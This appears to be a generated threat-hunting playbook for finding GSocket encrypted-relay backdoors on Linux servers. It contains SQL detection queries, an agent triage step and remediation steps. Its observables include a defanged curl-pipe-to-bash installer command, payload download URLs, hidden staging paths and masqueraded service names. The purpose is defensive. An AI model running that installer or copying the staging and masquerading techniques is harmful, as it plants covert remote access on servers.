---
analysis: A simple detection rule for GSocket domains would be noisy in environments
  where it is used for legitimate admin tasks. This hunt correlates the kernel vulnerability
  state with rare, non-standard persistence and outbound relay activity to identify
  malicious weaponization.
blind_spots:
- id: limited-linux-visibility
  question: Are kernel-thread masquerading events visible beyond the process command
    line?
  requires: hb_linux_audit or hb_syslog
  risk: Sophisticated GSocket variants that use prctl or other syscalls to rename
    threads may not be fully captured by process-only telemetry.
  stage: masqueraded-persistence
- id: encrypted-c2-blindness
  question: Can the content of the GSocket relay traffic be inspected?
  requires: Egress proxy TLS inspection
  risk: GSocket is end-to-end encrypted; without visibility into the traffic content,
    we rely entirely on process context and domain reputation.
  stage: encrypted-relay-c2
coverage:
- stage: privilege-escalation-exploit
  status: covered
  steps:
  - scoping-vulnerable-linux
- stage: masqueraded-persistence
  status: covered
  steps:
  - rare-persistence-job
- stage: encrypted-relay-c2
  status: covered
  steps:
  - relay-dns-lookup
- reason: 'Belongs to another part of the ''The global socket: how threat actors are
    weaponizing GSocket for stealthy C2'' series.'
  stage: initial-web-exploitation
  status: out_of_scope
- reason: 'Belongs to another part of the ''The global socket: how threat actors are
    weaponizing GSocket for stealthy C2'' series.'
  stage: deployment-downloader
  status: out_of_scope
- reason: 'Belongs to another part of the ''The global socket: how threat actors are
    weaponizing GSocket for stealthy C2'' series.'
  stage: concealed-staging
  status: out_of_scope
guardrails:
  claims: no_unsupported
  evidence: citation_required
  missing_data: not_benign
  telemetry: untrusted
hunt:
  applicability: campaign-specific
  handoff: promote-to-detection
  justification: GSocket creates a persistent backdoor that survives application patching.
    This hunt ensures that once a web vulnerability is remediated, the hidden relays
    used to maintain access are also identified and removed, protecting the host from
    long-term control.
  methodology: model-assisted
  trigger: intel-report
hypothesis: An intruder has maintained persistent access to a Linux server by deploying
  a GSocket relay after exploiting a kernel vulnerability, masquerading the relay
  as a system service while communicating outbound to a shared public network.
labels:
- hunt
- attack.t1036
- attack.t1053.003
- attack.t1543.002
- attack.t1068
- attack.t1071
- attack.t1090.002
- command and control
- defense evasion
- execution
- initial access
- persistence
- privilege escalation
name: Persistent GSocket Encrypted Relay Activity
parameters:
  c2_domains:
    default:
    - gsocket.io
    - cdn.gsocket.io
    - gsgg.b-cdn.net
    description: Known GSocket relay and distribution domains named in research.
    from:
      kind: article
      observed: '2026-11-11'
      ref: msrc-blog
    type: list[domain]
  gs_service_names:
    default:
    - systemd-remount-d
    - defunct.service
    - multi-user.target.wants
    description: Service and job names associated with GSocket persistence.
    from:
      kind: article
      observed: '2026-11-11'
      ref: msrc-blog
    type: list[string]
  lookback_days:
    default: '14'
    description: Days of history to examine for persistence and network activity.
    from:
      kind: manual
      observed: '2026-11-11'
      ref: standard-retention
    type: number
  scope_hosts:
    default: []
    description: Specific hostnames to focus on; leave empty to scan the entire Linux
      estate.
    from:
      kind: manual
      observed: '2026-11-11'
      ref: analyst-scoping
    type: list[host]
provenance:
  authors:
  - name: Huntbase hunt generation
    org: huntbase.io
  generated:
    by: huntbase-hunt-generation
    from: https://www.microsoft.com/en-us/security/blog/2026/11/11/global-socket-how-threat-actors-weaponizing-gsocket-stealthy-c2/
    gates:
    - dry-run
    - lint
    model: hb_google/gemini-3-flash-preview
rationale: Focus on Linux servers running PHP or cPanel environments, as research
  indicates these are the most common targets. Use the vulnerable host list as a primary
  anchor, but do not exclude hosts with DNS activity if they are not yet scanned for
  vulnerabilities.
references:
- name: "MSRC \u2014 The global socket: how threat actors are weaponizing GSocket\
    \ for stealthy C2"
  url: https://www.microsoft.com/en-us/security/blog/2026/11/11/global-socket-how-threat-actors-weaponizing-gsocket-stealthy-c2/
related:
- hunt: web-shell-aftermath-cleanup
  reason: This hunt follows the remediation of web shells to ensure no persistent
    relays remain on the host.
  relation: follows
- hunt: linux-web-server-gsocket-staging
  relation: follows
scenario:
  stages:
  - name: Web Application Compromise
    observables:
    - PHP web applications
    - cPanel hosting
    - Apache web server context
    - Remote code execution
    slug: initial-web-exploitation
    tactic: initial-access
    techniques:
    - T1190
  - name: Scripted Tool Retrieval
    observables:
    - curl -sSL hxxps://gsocket[.]io/y | bash
    - hxxps://gsocket[.]io/install.sh
    - hxxps://gsgg[.]b-cdn[.]net/bin/gs-netcat_mini-linux-x86_64
    - hxxps://cdn[.]gsocket[.]io/bin/gs-netcat_mini-linux-aarch64
    slug: deployment-downloader
    tactic: execution
    techniques:
    - T1105
    - T1059.004
  - name: Hidden Payload Staging
    observables:
    - /dev/shm/.gs-0/
    - /tmp/.gsn_ora
    - /tmp/systemd-remount-d
    - Memory-backed directories
    slug: concealed-staging
    tactic: defense-evasion
    techniques:
    - T1564.001
    - T1070.004
  - name: Kernel Exploitation
    observables:
    - CVE-2026-43284
    - Dirty Frag vulnerability
    slug: privilege-escalation-exploit
    tactic: privilege-escalation
    techniques:
    - T1068
  - name: Systemd and Cron Persistence
    observables:
    - systemd-remount-d
    - /usr/bin/systemd-remount-d
    - cron jobs
    - systemd units
    - kernel-thread-like names
    slug: masqueraded-persistence
    tactic: persistence
    techniques:
    - T1036
    - T1053.003
    - T1543.002
  - name: Relay Network C2
    observables:
    - gsocket.io
    - cdn.gsocket.io
    - gsgg.b-cdn.net
    - Outbound encrypted relay traffic
    - GS_TG_TOKEN
    - Telegram notification delivery
    slug: encrypted-relay-c2
    tactic: command-and-control
    techniques:
    - T1071
    - T1090.002
  summary: Threat actors are weaponizing GSocket, a legitimate encrypted relay tool,
    to maintain persistent outbound-only C2 on compromised Linux servers. By tunneling
    traffic through the public Global Socket Relay Network, attackers evade inbound
    firewall restrictions and bypass traditional IP-based blocking even after the
    initial web application vulnerability is patched.
series:
  index: 2
  slug: the-global-socket-how-threat-actors-are-weaponizing-gsocket-for-stealthy-c2
  title: 'The global socket: how threat actors are weaponizing GSocket for stealthy
    C2'
  total: 2
severity: high
targets:
  analyst:
    name: Tier-2 analyst
    role: analyst
  endpoint:
    category: endpoint
    name: Endpoint telemetry (hb_ surfaces)
    telemetry:
    - endpoint
  hunter:
    agent: true
    name: Hunt agent
tlp: clear
type: investigation
---


# Persistent GSocket Encrypted Relay Activity

This hunt identifies Linux hosts weaponized with GSocket (Global Socket) for long-term command and control. Threat actors use the Dirty Frag kernel vulnerability (CVE-2026-43284) to elevate privileges before installing GSocket relays that masquerade as legitimate system services like systemd-remount. Because GSocket connects outbound to a shared public relay network, traditional inbound firewall rules and fixed C2 domain blocking are ineffective. This hunt correlates vulnerability status with rare persistence mechanisms and outbound relay traffic patterns to identify active intrusions that persist even after the initial entry point is patched.

## scoping-vulnerable-linux
<!-- Scope hosts vulnerable to Dirty Frag -->
Identify Linux hosts reporting the Dirty Frag vulnerability (CVE-2026-43284), which was observed as a primary privilege escalation vector for GSocket deployment.

```sqlite target=endpoint role=scoping
~~~yaml
expected: A list of unique device identifiers currently reporting the kernel vulnerability.
  Silence suggests no unpatched hosts or no vulnerability scanning coverage.
reads:
- device_uid
- resource_uid
- status
- cvss_score
silence: not_evidence_of_absence
source: hb_vulnerability_finding
verified: dry-run
verified_at: '2026-11-12'
~~~
SELECT device_uid, resource_uid, status, cvss_score FROM hb_vulnerability_finding WHERE cve_uid = 'CVE-2026-43284' AND status != 'suppressed'
```

## parallel-evidence-collection
<!-- Fan-out persistence and C2 checks -->
parallel:
- → rare-persistence-job
- → relay-dns-lookup
join: → gsocket-triage

## rare-persistence-job
<!-- Identify rare GSocket persistence -->
Find rare cron or systemd jobs referencing GSocket file names, masqueraded service names, or staging paths like /dev/shm.

```sqlite target=endpoint role=detection-candidate params=(gs_service_names=gs_service_names, scope_hosts=scope_hosts, lookback_days=lookback_days)
~~~yaml
baseline:
  compare: first_seen
  window: '{{lookback_days}}d'
expected: Rare jobs on a few hosts that use masqueraded names or stage binaries in
  temporary memory-backed directories. Silence means no known names were found in
  job definitions.
prevalence:
  by: device_hostname
  key:
  - job_cmd_line
  - job_name
  rare_below: 3
reads:
- device_hostname
- job_name
- job_cmd_line
- time
silence: evidence_of_absence
source: hb_scheduled_job
verified: dry-run
verified_at: '2026-11-12'
~~~
SELECT LOWER(job_cmd_line) AS cmd, job_name, device_hostname, COUNT(DISTINCT device_hostname) AS hosts, MIN(time) AS first_seen FROM hb_scheduled_job WHERE (instr(',' || '{{gs_service_names}}' || ',', ',' || LOWER(job_name) || ',') > 0 OR job_cmd_line LIKE '%/dev/shm/%' OR job_cmd_line LIKE '%gs-netcat%') AND ('{{scope_hosts}}' = '' OR instr(',' || '{{scope_hosts}}' || ',', ',' || device_hostname || ',') > 0) AND time >= datetime('now', '-{{lookback_days}} days') GROUP BY LOWER(job_cmd_line), job_name, device_hostname HAVING hosts <= 3 ORDER BY hosts ASC
```

## relay-dns-lookup
<!-- Check for relay infrastructure lookups -->
Identify hosts resolving GSocket domains, which indicates the client binary is attempting to connect to the shared relay network.

```sqlite target=endpoint role=enrichment params=(c2_domains=c2_domains, scope_hosts=scope_hosts, lookback_days=lookback_days)
~~~yaml
expected: Outbound DNS requests to the relay infrastructure. Silence proves no resolution
  attempts to these specific domains occurred in the window.
reads:
- device_hostname
- query_hostname
- process_name
- time
silence: evidence_of_absence
source: hb_dns_activity
verified: dry-run
verified_at: '2026-11-12'
~~~
SELECT device_hostname, query_hostname, process_name, COUNT(*) AS lookups, MIN(time) AS first_seen FROM hb_dns_activity WHERE (instr(',' || '{{c2_domains}}' || ',', ',' || LOWER(query_hostname) || ',') > 0) AND ('{{scope_hosts}}' = '' OR instr(',' || '{{scope_hosts}}' || ',', ',' || device_hostname || ',') > 0) AND time >= datetime('now', '-{{lookback_days}} days') GROUP BY device_hostname, query_hostname, process_name ORDER BY lookups DESC
```

## gsocket-triage
<!-- Analyze GSocket activity per host -->
```agent target=hunter
cite: required
context:
- scoping-vulnerable-linux
- rare-persistence-job
- relay-dns-lookup
max_iterations: 4
objective: Determine if any host vulnerable to Dirty Frag shows rare persistence mechanisms
  in cron/systemd or outbound DNS lookups to GSocket domains.
success_criteria: A per-host verdict citing rows from all three context steps where
  applicable.
tools:
- endpoint
```

## route-on-verdict
<!-- Route by agent verdict -->
if~: "the gsocket-triage verdict is malicious for at least one host" (confidence: high, judge=hunter)
then: → isolate-and-remediate
indeterminate: → manual-forensic-review
unavailable: → manual-forensic-review (blind_spot: limited-linux-visibility)
else: → manual-forensic-review

## isolate-and-remediate
<!-- Isolate host and remediate GSocket -->
```action target=endpoint
~~~yaml
approval: required
~~~
Isolate the endpoint via the EDR agent. Terminate every process associated with the identified job command lines. Remove identified cron jobs, systemd units, and files in /dev/shm or /tmp as cited by the agent. Revoke sessions for the web service account.
```
→ manual-forensic-review

## manual-forensic-review
<!-- Manual forensic review -->
```manual target=analyst
Review the agent's findings and the results of the remediation action. Check for other common persistence points like shell profiles (.bashrc) or kernel-thread masqueraded processes. Schedule a kernel update to patch CVE-2026-43284.
```
→ hunt-closeout

## hunt-closeout
<!-- Hunt closeout and documentation -->
```manual target=analyst
Record all identified indicators of compromise. Update the enterprise blocklist for GSocket relay domains and provide a summary of the masquerading names used in the intrusion to the detection team.
```
→ end
